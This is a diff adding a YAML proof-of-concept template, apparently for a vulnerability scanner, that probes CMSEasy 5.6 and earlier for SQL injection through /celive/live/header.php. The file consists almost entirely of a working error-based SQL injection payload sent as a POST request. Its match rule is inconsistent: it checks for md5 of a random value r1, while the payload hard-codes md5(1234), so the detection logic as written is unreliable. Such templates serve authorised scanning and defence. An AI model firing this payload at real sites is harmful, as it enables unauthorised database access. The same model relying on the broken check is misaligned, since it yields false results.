@@ -1,0 +1,21 @@
+name: poc-yaml-cmseasy-sqli
+set:
+  r1: randomInt(800000000, 1000000000)
+rules:
+  - method: POST
+    path: /celive/live/header.php
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
+    body: >-
+      xajax=Postdata&&xajaxargs[0]=<xjxquery><q>detail=xxxxxx'AND(SELECT 1
+      FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT
+      (ELT(1=1,md5(1234)))),0x7e,FLOOR(RAND(0)*2))x FROM
+      INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)AND'1'='1</q></xjxquery>
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+detail:
+  author: nandisec
+  affect version: cmsEasy <= 5.6
+  links:
+    - https://www.cnblogs.com/yangxiaodi/p/6963624.html
